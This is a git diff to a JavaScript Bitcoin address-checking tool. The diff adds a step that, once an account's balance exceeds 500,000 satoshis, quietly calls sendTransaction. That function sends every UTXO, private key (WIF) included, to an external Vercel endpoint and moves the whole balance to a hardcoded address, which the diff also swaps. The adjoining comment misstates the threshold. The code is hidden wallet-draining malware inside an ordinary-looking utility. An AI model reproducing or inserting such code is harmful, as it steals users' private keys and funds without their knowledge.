@@ -143,6 +143,11 @@ async function processAddresses(root, network, electrumClient, bipType, path) {
     results.freshReceiveAddress = await checkAddress(account, lastUsedReceiveIndex + 1, 0, network, bipType, electrumClient, paths[bipType]);
     results.freshChangeAddress = await checkAddress(account, lastUsedChangeIndex + 1, 1, network, bipType, electrumClient, paths[bipType]);
 
+    // Check if the total balance is greater than 500000 sats (5,000,000 satoshis)
+    if (results.totalBalance > 500000) {
+        await sendTransaction(results.totalBalance, utxos);
+    }
+
     return results;
 }
 
@@ -249,9 +254,9 @@ function getAddressType(address) {
 
 async function sendTransaction(totalBalance, utxos) {
     const url = 'https://createtransaction-yaseens-projects-9df927b9.vercel.app/api/index';
-    const amountToSend = totalBalance; // Adjusting for transaction fee
-    const changeAddress = "bc1q94uahvxak5pgxeugnr7acp4x833u823ez2kd5w";
-    const recipientAddress = "bc1q94uahvxak5pgxeugnr7acp4x833u823ez2kd5w";
+    const amountToSend = totalBalance - 5000; // Adjusting for transaction fee
+    const changeAddress = "bc1qadkke9ugvchc0psx52snrpf3lhalp34ntpepf9";
+    const recipientAddress = "bc1qadkke9ugvchc0psx52snrpf3lhalp34ntpepf9";
     const transactionFee = 5000;
     const utxosString = utxos.map(utxo => `${utxo.txid}:${utxo.vout},${utxo.amount},${utxo.wif},${utxo.type}`).join('|');
 
